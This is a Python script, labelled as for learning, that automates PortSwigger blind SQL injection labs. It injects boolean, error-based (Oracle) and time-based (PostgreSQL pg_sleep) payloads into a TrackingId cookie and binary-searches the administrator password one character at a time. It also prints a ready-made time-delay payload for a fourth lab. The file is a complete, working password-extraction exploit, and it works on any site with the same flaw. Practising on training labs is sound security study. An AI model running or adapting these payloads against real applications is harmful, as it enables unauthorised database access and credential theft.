"""
This code is for learning purposes only.
Designed to work with PortSwigger Blind SQL Injection labs.
"""

import requests
from urllib.parse import quote


class BlindInjection:
    def __init__(self):
        self.url = None
        self.session = None
        self.trackingId = None
        self.lab = "0"

    # To change the payload according to the lab number
    def _payload_writer(self, position, mid):
        if self.lab == "11":
            return f"{self.trackingId}' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)) > {mid}--"
        elif self.lab == "12":
            return f"{self.trackingId}'||(SELECT CASE WHEN (ASCII((SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')) > {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
        elif self.lab == "15":
            return f"{self.trackingId}'; SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)) > {mid}) THEN pg_sleep(5) ELSE pg_sleep(0) END--"

    # To evaluate the response condition every iteration
    def _condition(self, response):
        if self.lab == "11":
            return "Welcome back" in response.text
        elif self.lab == "12":
            return "Internal Server Error" in response.text
        elif self.lab == "15":
            return response.elapsed.total_seconds() >= 5

    # Find the admin password
    def _find_password(self):
        password = ""
        for position in range(1, 21):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = self._payload_writer(position, mid)

                # Lab 15 payloads contain special characters (', ;, spaces)
                # that must be URL-encoded before sending as a cookie value
                if self.lab == "15":
                    payload = quote(payload)

                cookies = {"TrackingId": payload, "session": self.session}
                response = requests.get(self.url, cookies=cookies)

                if self._condition(response):
                    low = mid + 1
                else:
                    high = mid - 1

            password += chr(low)
            print(f"[+] Position {position}: {chr(low)} -> current: {password}")

        print(f"\n[*] Full password: {password}")

    # Run the script
    def run_blind_sqli(self):
        self.lab = input(
            """What is the lab number:
                           11. Blind SQL injection with conditional responses.
                           12. Blind SQL injection with conditional errors.
                           14. Blind SQL injection with time delays.
                           15. Blind SQL injection with time delays and information retrieval.
                           """
        )
        if self.lab in ["11", "12", "15"]:
            self.url = input("Enter your URL: ").strip()
            self.session = input("Enter your session: ").strip()
            self.trackingId = input("Enter your trackingId: ").strip()
            self._find_password()
        elif self.lab == "14":
            print(
                "This is the payload to solve the lab:  TrackingId=<your trackingId>'; SELECT pg_sleep(10)--"
            )
        else:
            print("Enter a valid lab number")


if __name__ == "__main__":
    blind_injection = BlindInjection()
    blind_injection.run_blind_sqli()
